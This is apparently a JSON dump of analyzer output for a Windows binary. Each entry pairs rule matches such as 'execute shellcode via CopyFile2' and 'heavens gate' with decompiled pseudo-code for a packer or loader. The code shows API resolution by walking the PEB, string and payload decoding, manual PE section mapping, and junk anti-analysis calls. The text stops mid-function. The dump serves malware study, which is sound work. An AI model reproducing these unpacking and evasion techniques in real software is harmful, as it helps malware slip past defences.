{
    "00401000": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nuint fcn.00401000(void)\n\n{\n    // [00] -r-x section size 12288 named .text\n    return 0x33;\n}\n",
        "token_count": 36
    },
    "00401055": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.00401055(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iStack76;\n    int32_t iStack72;\n    uchar *puStack68;\n    uint *puStack64;\n    uchar *puStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uchar auStack48 [4];\n    uchar auStack44 [4];\n    uint auStack40 [2];\n    uint auStack32 [2];\n    uchar auStack24 [8];\n    uint var_ch;\n    \n    uStack52 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n    puStack56 = auStack48;\n    puStack60 = auStack44;\n    puStack64 = auStack32;\n    puStack68 = auStack24;\n    iStack72 = 0;\n    do {\n        iStack76 = iStack72;\n        (*_sym.imp.USER32.dll_GetScrollPos)(0xa96b3, 0x632);\n        (*_sym.imp.USER32.dll_GetCursor)();\n        auStack32[0] = 0xf;\n        auStack40[0] = 0x3dd;\n        uStack52 = 0x3dd;\n        uVar3 = 0;\n        uVar2 = 0x5029a7;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetTapePosition)(0x5029a7, 0, auStack32, auStack40, &uStack52);\n        iStack76 = 0x5e;\n        (*_sym.imp.KERNEL32.dll_GetNamedPipeServerSessionId)(0x69dd07, &iStack76, uVar2, uVar3, uVar1);\n        iStack72 = iStack76 + 1;\n    } while (iStack72 != 5);\n    return;\n}\n",
        "token_count": 422
    },
    "00402fbf": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00402fbf(int32_t *arg_8h)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    uint arg_8h_00;\n    code *pcVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iStack144;\n    char acStack128 [32];\n    uint32_t uStack96;\n    int32_t iStack92;\n    int32_t iStack84;\n    int32_t iStack80;\n    int32_t iStack76;\n    int32_t iStack72;\n    int32_t iStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    int32_t iStack56;\n    int32_t iStack52;\n    uint32_t uStack48;\n    int32_t iStack44;\n    uint32_t uStack40;\n    int32_t *piStack36;\n    uint32_t uStack32;\n    int32_t iStack24;\n    uint var_ch;\n    \n    uVar2 = uStack32;\n    iStack24 = 0x42d72956;\n    uStack32 = uStack32 | 0x2ee4e352;\n    iStack92 = 0;\n    uStack96 = 0x607bca76;\n    iStack84 = 0;\n    iStack44 = 0;\n    do {\n        iStack84 = (*(iStack44 * 0x24 + 0x421924) ^ *(iStack44 * 0x24 + 0x421920)) + iStack84;\n        iStack44 = iStack44 + 1;\n        piStack36 = arg_8h;\n    } while (iStack44 != 0x1c);\n    uStack40 = 0;\n    iStack68 = iStack84;\n    do {\n        do {\n            piStack36 = piStack36 ^ 0x13cbb527;\n            uVar5 = 0x42d72964 - iStack24;\n            acStack128[uStack40] = *(uStack40 + 0x404139) - *((uStack40 & 7) + 0x404247);\n            uStack40 = uStack40 + 1;\n        } while (uStack40 != uVar5);\n        arg_8h_00 = fcn.0040146b();\n        pcVar3 = fcn.00401dde(arg_8h_00, acStack128);\n        iStack60 = (*pcVar3)(0, iStack68, 0x1000, 4);\n        iStack144 = 0;\n        iStack52 = 0;\n        while( true ) {\n            iStack72 = iStack52;\n            iStack80 = iStack144;\n            uVar5 = *(iStack52 * 0x24 + 0x421924);\n            iStack56 = *(iStack52 * 0x24 + 0x421914);\n            uStack48 = *(iStack52 * 0x24 + 0x421920);\n            uVar4 = uStack48 ^ uVar5;\n            iStack76 = iStack60 + iStack144;\n            bVar1 = 0x1cdf4050 < uStack96;\n            if (iStack92 != 0) {\n                bVar1 = iStack92 != 0;\n            }\n            uStack40 = 0x3d1526a0;\n            if (!bVar1) break;\n            uStack64 = 0;\n            if (uStack48 != uVar5) {\n                do {\n                    *(iStack76 + uStack64) = *(iStack56 + uStack64);\n                    uStack64 = uStack64 + 1;\n                } while (uStack64 != uVar4);\n            }\n            iStack144 = uVar4 + iStack144;\n            uStack32 = uVar2 ^ 0x672ea64d;\n            piStack36 = piStack36 * 2;\n            iStack52 = iStack52 + 1;\n            if (iStack52 == 0x1c) {\n                fcn.004022f8(iStack60, iStack60, iStack68);\n                *arg_8h = iStack60 + 0x65f8;\n                arg_8h[1] = 0x11600;\n                arg_8h[2] = iStack60 + 0x7ce;\n                arg_8h[3] = 0x5e00;\n                return 0;\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 1015
    },
    "null": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nuint entry0(void)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t iStack240;\n    int32_t iStack236;\n    int32_t iStack232;\n    uchar *puStack228;\n    uchar auStack224 [104];\n    uchar auStack120 [4];\n    uchar auStack116 [32];\n    uchar auStack84 [4];\n    uchar auStack80 [36];\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    \n    *0x421cf4 = unaff_ESI;\n    *0x421cf8 = unaff_EDI;\n    *0x421cfc = unaff_EBX;\n    *0x421d00 = unaff_EBP;\n    *0x421d04 = *0x10;\n    fcn.00401055();\n    uStack36 = 0;\n    uStack40 = 0x6e90a9b3;\n    uStack44 = 0x1435e241;\n    fcn.00401055();\n    puStack228 = auStack80;\n    iStack232 = 0;\n    do {\n        iVar4 = iStack232;\n        uVar6 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        uVar7 = (*_sym.imp.USER32.dll_GetParent)(uVar6);\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        uVar9 = (*_sym.imp.KERNEL32.dll_GetThreadLocale)();\n        (*_sym.imp.KERNEL32.dll_GetNativeSystemInfo)(auStack84, uVar6, uVar9, uVar8, uVar7);\n        iStack232 = iVar4 + 1;\n    } while (iStack232 != 7);\n    iVar4 = fcn.0040279b(_sym.imp.GDI32.dll_SetRectRgn);\n    if (iVar4 == 0) {\n        fcn.00401055();\n        fcn.004020a3();\n    }\n    uVar5 = uStack32 << (uStack32 & 0x1f);\n    uVar1 = uStack32 & 0x1f;\n    uVar2 = uStack32 >> 0x20 - uVar1;\n    uVar3 = uStack32 & 0x20;\n    uStack32 = uVar5;\n    uStack28 = uStack28 << uVar1 | uVar2;\n    if (uVar3 != 0) {\n        uStack32 = 0;\n        uStack28 = uVar5;\n    }\n    iStack236 = 0;\n    do {\n        iStack240 = iStack236;\n        iVar4 = (*_sym.imp.USER32.dll_TranslateMDISysAccel)(0xe8714, auStack120);\n        (*_sym.imp.KERNEL32.dll_WaitForDebugEvent)(auStack224, 0xec);\n        iStack240 = iVar4;\n        (*_sym.imp.KERNEL32.dll_GetNumaAvailableMemoryNode)(6, &iStack240);\n        (*_sym.imp.ADVAPI32.dll_SetUserFileEncryptionKey)(auStack116);\n        (*_sym.imp.KERNEL32.dll_SignalObjectAndWait)(0x985061, 0x985061, 0xdd7, 0x79b);\n        (*_sym.imp.SHLWAPI.dll_SHRegCloseUSKey)(0x6110a);\n        (*_sym.imp.KERNEL32.dll_LocalFree)(0x49160);\n        (*_sym.imp.GDI32.dll_WidenPath)(0x2fc9a);\n        (*_sym.imp.USER32.dll_GetWindowRgn)(0x7ca95e, 0xd9959d);\n        (*_sym.imp.USER32.dll_SetMenuDefaultItem)(0x2438de, 0x289, 0x289);\n        iStack236 = iStack240 + 1;\n    } while (iStack236 != 0x181);\n    return 0;\n}\n",
        "token_count": 955
    },
    "0040146b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t fcn.0040146b(void)\n\n{\n    uint64_t uVar1;\n    uint16_t uVar2;\n    uint16_t uVar6;\n    uint16_t uVar7;\n    uint16_t uVar9;\n    uint16_t uVar10;\n    uchar auVar3 [12];\n    uint16_t uVar11;\n    uint16_t uVar12;\n    uchar auVar5 [16];\n    uint16_t uVar13;\n    int32_t iStack152;\n    int32_t iStack144;\n    uint32_t uStack140;\n    ushort auStack124 [32];\n    uint64_t auStack60 [4];\n    uint uStack28;\n    uint var_8h;\n    uchar auVar4 [13];\n    uchar uVar8;\n    \n    auStack60[0]._0_1_ = 0;\n    uStack140 = 0;\n    do {\n        *(auStack60 + uStack140) = *(uStack140 + 0x404113) - *((uStack140 & 7) + 0x404247);\n        uStack140 = uStack140 + 1;\n    } while (uStack140 != 0xe);\n    auStack124[0] = 0;\n    iStack144 = 0;\n    do {\n        uVar1 = *(auStack60 + iStack144);\n        uVar8 = SUB141(ZEXT814(uVar1) >> 0x30, 0);\n        auVar4 = ZEXT813(uVar1);\n        auVar3 = ZEXT812(uVar1);\n        auVar5 = psraw(CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(SUB1610(\n                                                            CONCAT97(SUB169(CONCAT88(SUB168(CONCAT79(SUB167(CONCAT610(\n                                                            SUB166(CONCAT511(SUB165(CONCAT412(SUB164(CONCAT313(SUB163(\n                                                            CONCAT214(SUB162(CONCAT115(SUB161(ZEXT816(uVar1) >> 0x38, 0)\n                                                                                       , CONCAT114(SUB151(ZEXT815(uVar1)\n                                                                                                          >> 0x38, 0), \n                                                                                                   ZEXT814(uVar1))) >>\n                                                                             0x70, 0), CONCAT113(uVar8, auVar4)) >> 0x68\n                                                            , 0), CONCAT112(uVar8, auVar3)) >> 0x60, 0), \n                                                            CONCAT111(SUB131(auVar4 >> 0x28, 0), ZEXT811(uVar1))) >>\n                                                            0x58, 0), CONCAT110(SUB121(auVar3 >> 0x28, 0), uVar1)) >>\n                                                            0x50, 0), CONCAT19(SUB131(auVar4 >> 0x20, 0), uVar1)) >>\n                                                            0x48, 0), CONCAT18(SUB121(auVar3 >> 0x20, 0), uVar1)) >>\n                                                            0x40, 0), (uVar1 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (uVar1 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (uVar1 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (uVar1 >> 0x10) << 0x20) >> 0x20, 0), (uVar1 >> 8) << 0x18)\n                                                           >> 0x18, 0), (uVar1 >> 8) << 0x10) >> 0x10, 0), \n                                 uVar1 & 0xff | uVar1 << 8), 8);\n        uStack28 = 0x77cfabe6;\n        *(auStack124 + iStack144) = auVar5;\n        uVar2 = str.cccccccc[0] & *0x4040a0;\n        uVar6 = str.cccccccc[1] & *0x4040a2;\n        uVar7 = str.cccccccc[2] & *0x4040a4;\n        uVar9 = str.cccccccc[3] & *0x4040a6;\n        uVar10 = str.cccccccc[4] & *0x4040a8;\n        uVar11 = str.cccccccc[5] & *0x4040aa;\n        uVar12 = str.cccccccc[6] & *0x4040ac;\n        uVar13 = str.cccccccc[7] & *0x4040ae;\n        *(auStack60 + iStack144) =\n             CONCAT17((0 < uVar13) * (uVar13 < 0xff) * uVar13 - (0xff < uVar13), \n                      CONCAT16((0 < uVar12) * (uVar12 < 0xff) * uVar12 - (0xff < uVar12), \n                               CONCAT15((0 < uVar11) * (uVar11 < 0xff) * uVar11 - (0xff < uVar11), \n                                        CONCAT14((0 < uVar10) * (uVar10 < 0xff) * uVar10 - (0xff < uVar10), \n                                                 CONCAT13((0 < uVar9) * (uVar9 < 0xff) * uVar9 - (0xff < uVar9), \n                                                          CONCAT12((0 < uVar7) * (uVar7 < 0xff) * uVar7 - (0xff < uVar7)\n                                                                   , CONCAT11((0 < uVar6) * (uVar6 < 0xff) * uVar6 -\n                                                                              (0xff < uVar6), \n                                                                              (0 < uVar2) * (uVar2 < 0xff) * uVar2 -\n                                                                              (0xff < uVar2))))))));\n        iStack144 = iStack144 + 8;\n    } while (iStack144 != 0x20);\n    iStack152 = fcn.004028d0(auStack124, 0);\n    if (iStack152 == 0) {\n        iStack152 = 0;\n    }\n    return iStack152;\n}\n",
        "token_count": 1420
    },
    "00401584": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x00401647)\n// WARNING: Removing unreachable block (ram,0x004016e4)\n// WARNING: Removing unreachable block (ram,0x0040165b)\n\nint32_t __cdecl fcn.00401584(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iStack92;\n    uint var_bp_ch;\n    \n    iStack92 = 0;\n    if (arg_10h != 0) {\n        do {\n            *(arg_8h + iStack92) = *(arg_ch + iStack92);\n            iStack92 = iStack92 + 1;\n        } while (iStack92 != arg_10h);\n    }\n    return arg_8h;\n}\n",
        "token_count": 190
    },
    "004017cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Removing unreachable block (ram,0x0040191d)\n\nuint fcn.004017cc(void)\n\n{\n    uint8_t *puVar1;\n    uchar uVar2;\n    uint uVar3;\n    uchar *unaff_EDI;\n    bool bVar4;\n    uint8_t *puStack80;\n    int32_t iStack48;\n    uint var_4h;\n    \n    uVar2 = (*0x4033a2)();\n    *unaff_EDI = uVar2;\n    *0x99530092 = 0x401930;\n    in(0x28);\n    *0xa3616168 = (*_sym.imp.RPCRT4.dll_RpcMgmtSetComTimeout)();\n    *puStack80 = *0xa3616168;\n    puVar1 = iStack48 + -0x67;\n    bVar4 = CARRY1(*puVar1, *0xa3616168);\n    *puVar1 = *puVar1 + *0xa3616168;\n    in(0x28);\n    uVar3 = 3;\n    if ((-bVar4 & 1U) == 0) {\n        uVar3 = 0xed37ef0f;\n    }\n    return uVar3;\n}\n",
        "token_count": 292
    },
    "00401991": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nbool fcn.00401991(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_FS_OFFSET;\n    bool bVar3;\n    uint var_bp_ch;\n    \n    iVar1 = fcn.0040146b();\n    iVar2 = 0;\n    if (*(iVar1 + *(iVar1 + 0x3c)) == 0x4550) {\n        iVar2 = iVar1 + *(iVar1 + 0x3c);\n    }\n    bVar3 = true;\n    if (5 < *(iVar2 + 0x48)) {\n        iVar2 = *((-(*(in_FS_OFFSET + 0x18) == 0) | *(in_FS_OFFSET + 0x18)) + 0x30);\n        bVar3 = false;\n        if (iVar2 != 0) {\n            bVar3 = *(iVar2 + 0xa4) < 6;\n        }\n    }\n    return bVar3;\n}\n",
        "token_count": 228
    },
    "00401b4a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401b87)\n\nuint fcn.00401b4a(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    if (iVar1 == 0) {\n        iVar1 = -1;\n    }\n    return *(iVar1 + 0x30);\n}\n",
        "token_count": 130
    },
    "00401bba": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t __cdecl fcn.00401bba(int32_t arg_8h)\n\n{\n    char cVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uStack40;\n    uint16_t *puStack36;\n    uint32_t uStack24;\n    uint var_bp_ch;\n    \n    iVar4 = fcn.00402b87();\n    iVar5 = 0;\n    if (*(iVar4 + *(iVar4 + 0x3c)) == 0x4550) {\n        iVar5 = iVar4 + *(iVar4 + 0x3c);\n    }\n    iVar5 = *(iVar5 + 0x78);\n    uVar3 = *(iVar4 + 0x18 + iVar5);\n    if (uVar3 != 0) {\n        puStack36 = iVar4 + *(iVar4 + iVar5 + 0x24);\n        uStack24 = 0;\n        do {\n            uStack40 = 0;\n            do {\n                cVar1 = *(iVar4 + *(iVar4 + *(iVar4 + 0x20 + iVar5) + uStack24 * 4) + uStack40);\n                cVar2 = *(arg_8h + uStack40);\n                if (cVar1 == '\\0') break;\n                uStack40 = uStack40 + 1;\n            } while ((cVar1 == cVar2 && cVar2 != '\\0') && uStack40 < 0x20);\n            if (cVar1 == cVar2) {\n                return iVar4 + *(iVar4 + *(iVar4 + iVar5 + 0x1c) + *puStack36 * 4);\n            }\n            puStack36 = puStack36 + 1;\n            uStack24 = uStack24 + 1;\n        } while (uStack24 < uVar3);\n    }\n    return 0;\n}\n",
        "token_count": 443
    },
    "00401dde": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00401dde(uint arg_8h, int32_t arg_ch)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    bool bVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint uStack140;\n    char acStack136 [32];\n    uint32_t uStack104;\n    uint uStack100;\n    uint uStack96;\n    ushort uStack90;\n    ushort uStack88;\n    ushort uStack86;\n    int32_t iStack84;\n    uint32_t uStack80;\n    int32_t iStack76;\n    uint32_t uStack72;\n    int32_t iStack68;\n    uint32_t uStack64;\n    ushort *puStack60;\n    char cStack53;\n    int32_t iStack52;\n    uint32_t uStack48;\n    code *pcStack44;\n    uint uStack40;\n    int32_t iStack36;\n    uint32_t uStack32;\n    int32_t iStack28;\n    uint var_ch;\n    \n    iStack36 = 0x3bc7334b;\n    uStack48 = 0x67900ea4;\n    iStack68 = 0;\n    uStack72 = 0x1655a6de;\n    uStack64 = 0;\n    uStack40 = 0;\n    uStack140 = 0;\n    if (arg_ch != 0) {\n        do {\n            do {\n                uVar6 = 0x3bc73363 - iStack36;\n                acStack136[uStack64] = *(uStack64 + 0x404121) - *((uStack64 & 7) + 0x404247);\n                iVar5 = uStack32 * iStack28;\n                uVar1 = uStack32;\n                uVar2 = uStack32;\n                uVar4 = uVar1 * uVar2;\n                uStack64 = uStack64 + 1;\n                uStack32 = uVar4 * 2;\n                iStack28 = ((uVar1 * uVar2 >> 0x20) + iVar5 * 2) * 2 + CARRY4(uVar4, uVar4);\n            } while (uStack64 != uVar6);\n            pcStack44 = fcn.00401bba(acStack136);\n            if (pcStack44 == NULL) {\n                return 0;\n            }\n            puStack60 = &uStack88;\n            iStack76 = 0;\n            iVar5 = iStack76;\n            do {\n                iStack76 = iVar5;\n                iStack52 = iStack76;\n                iVar5 = iStack76 + 1;\n            } while (*(arg_ch + iStack76) != '\\0');\n            iStack52._0_2_ = iStack76;\n            uStack88 = iStack52;\n            iStack84 = arg_ch;\n            uStack104 = 0;\n            do {\n                uVar4 = uStack104;\n                uStack80 = uStack104;\n                cStack53 = *(arg_ch + uStack104);\n                bVar3 = 0x573b80ad < uStack72;\n                if (iStack68 != 0) {\n                    bVar3 = iStack68 != 0;\n                }\n                uStack104 = 0x5db03fd4;\n            } while ((bVar3) || (uStack104 = uVar4 + 1,  cStack53 != '\\0'));\n            uStack90 = uVar4;\n            uStack64 = 0x538895dc;\n            uStack40 = 0x3bc7334b;\n            iStack76 = iVar5;\n        } while (uStack48 < 0x257057d2);\n        uStack40 = 0x3a072243;\n        uStack100 = 0;\n        if ((uVar4 & 0xffff) != 0) {\n            uStack96 = 0;\n            uStack86 = uStack90;\n            (*pcStack44)(arg_8h, &uStack88, 0, &uStack96);\n            uStack100 = uStack96;\n        }\n        uStack140 = uStack100;\n    }\n    return uStack140;\n}\n",
        "token_count": 955
    },
    "004022af": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004022af(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    var_14h = 0;\n    iVar1 = var_14h;\n    do {\n        var_14h = iVar1;\n        iVar1 = var_14h + 1;\n    } while (*(arg_8h + var_14h) != '\\0');\n    return var_14h;\n}\n",
        "token_count": 125
    },
    "004022f8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004022f8(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_24h = 0;\n    if (arg_8h != 0 && arg_ch != 0) {\n        do {\n            for (uVar1 = *(var_24h * 4 + 0x404148); uVar1 < arg_10h; uVar1 = uVar1 + 0x33) {\n                *(arg_8h + uVar1) = *(arg_ch + uVar1) - *(uVar1 % 0x32 + 0x404214);\n            }\n            var_24h = var_24h + 1;\n        } while (var_24h != 0x33);\n    }\n    return;\n}\n",
        "token_count": 256
    },
    "004023af": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x004025c4)\n// WARNING: Removing unreachable block (ram,0x004024ac)\n\nvoid __cdecl fcn.004023af(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack100;\n    int32_t iStack68;\n    uint32_t uStack52;\n    int32_t iStack44;\n    uint var_ch;\n    \n    if (arg_8h != 0 && arg_ch != 0) {\n        iVar4 = 0;\n        if (*(arg_ch + *(arg_ch + 0x3c)) == 0x4550) {\n            iVar4 = arg_ch + *(arg_ch + 0x3c);\n        }\n        if (*(iVar4 + 6) != 0) {\n            iStack68 = *(iVar4 + 0x14) + 0x18 + iVar4;\n            uStack52 = 0;\n            do {\n                iVar3 = *(iVar4 + 0x54);\n                iStack100 = 0;\n                if (uStack52 == 0 && iVar3 != 0) {\n                    do {\n                        *(arg_8h + iStack100) = *(arg_ch + iStack100);\n                        iStack100 = iStack100 + 1;\n                    } while (iStack100 != iVar3);\n                }\n                iVar3 = *(iStack68 + 0xc);\n                iVar1 = *(iStack68 + 0x10);\n                iStack44 = 0;\n                iVar2 = *(iStack68 + 0x14);\n                if (iVar1 != 0) {\n                    do {\n                        *(arg_8h + iVar3 + iStack44) = *(arg_ch + iVar2 + iStack44);\n                        iStack44 = iStack44 + 1;\n                    } while (iStack44 != iVar1);\n                }\n                uStack52 = uStack52 + 1;\n                iStack68 = iStack68 + 0x28;\n            } while (uStack52 < *(iVar4 + 6));\n        }\n    }\n    return;\n}\n",
        "token_count": 500
    },
    "0040267d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nbool __cdecl fcn.0040267d(char *arg_8h)\n\n{\n    char *pcStack56;\n    uint var_bp_ch;\n    \n    pcStack56 = arg_8h;\n    if (arg_8h != NULL) {\n        do {\n            if ((pcStack56[1] != '%') || (*pcStack56 != -1)) {\n                if (pcStack56[4] != -0x33) {\n                    return false;\n                }\n                if (*pcStack56 != -0x48) {\n                    return false;\n                }\n                return pcStack56[3] == 'P';\n            }\n            pcStack56 = **(pcStack56 + 2);\n        } while (pcStack56 != NULL);\n    }\n    return false;\n}\n",
        "token_count": 180
    },
    "0040279b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040279b(uint arg_8h)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.0040267d(arg_8h);\n    bVar2 = true;\n    if (iVar1 == 0) {\n        iVar1 = fcn.00401991();\n        bVar2 = iVar1 != 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 122
    },
    "004027f2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Removing unreachable block (ram,0x00402868)\n\nint16_t * __cdecl fcn.004027f2(int32_t arg_8h)\n\n{\n    code *pcStack44;\n    int16_t *piStack28;\n    uint var_bp_4h;\n    \n    pcStack44 = fcn.00401abc;\n    if (arg_8h == 0) {\n        for (; (*pcStack44 != 0x5a4d || (piStack28 = pcStack44,  *(pcStack44 + *(pcStack44 + 0x3c)) != 0x4550));\n            pcStack44 = pcStack44 + -0x1000 & 0xfffff000) {\n        }\n    }\n    else {\n        piStack28 = fcn.004028d0(arg_8h, 0);\n    }\n    return piStack28;\n}\n",
        "token_count": 211
    },
    "004028d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t * __cdecl fcn.004028d0(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int16_t iVar3;\n    int32_t in_FS_OFFSET;\n    bool bVar4;\n    uint32_t uStack64;\n    int32_t *piStack56;\n    uint var_bp_ch;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    if (iVar1 == 0) {\n        iVar1 = -1;\n    }\n    iVar1 = *(*(iVar1 + 0x30) + 0xc);\n    piVar2 = iVar1 + 0x14;\n    piStack56 = *(iVar1 + 0x14);\n    if (piStack56 != piVar2) {\n        do {\n            if (arg_ch != NULL && piStack56[4] == arg_ch) {\n                return piStack56 + -2;\n            }\n            if (arg_8h != 0) {\n                uStack64 = 0;\n                if (*(piStack56 + 9) >> 1 != 0) {\n                    do {\n                        iVar3 = *(piStack56[10] + uStack64 * 2);\n                        if (iVar3 - 0x41U < 0x1a) {\n                            iVar3 = iVar3 + 0x20;\n                        }\n                        bVar4 = *(arg_8h + uStack64 * 2) == iVar3;\n                        uStack64 = uStack64 + 1;\n                   